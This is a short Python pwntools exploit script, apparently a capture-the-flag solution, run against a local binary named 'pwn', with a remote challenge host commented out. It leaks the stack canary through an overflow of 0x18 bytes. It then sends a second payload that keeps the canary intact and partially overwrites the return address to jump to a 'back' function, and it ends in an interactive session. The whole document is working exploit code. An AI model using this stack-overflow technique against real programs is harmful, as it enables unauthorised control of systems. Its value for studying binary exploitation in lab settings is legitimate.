from pwn import *
context(log_level='debug',arch='amd64')
p=process('./pwn')
#p=remote('43.248.97.200',40123)

back=0x11ee


payload=b'a'*0x18
#p.recvuntil('Input your name: ')
p.sendline(payload)

#p.recvunitl('Hello~ ')
p.recvuntil('aaaa\n')
#canary=int(p.recv(8),16)#[-7:].rjust(8,b'0'),
canary = u64(p.recv(7).rjust(8,b'\x00'))
print(int(canary))
print("canary",p64(canary))

gdb.attach(p)
payload2=b'a'*0x18+p64(canary)+p64(0)+b'\x11\xee'
p.send(payload2)


p.interactive()
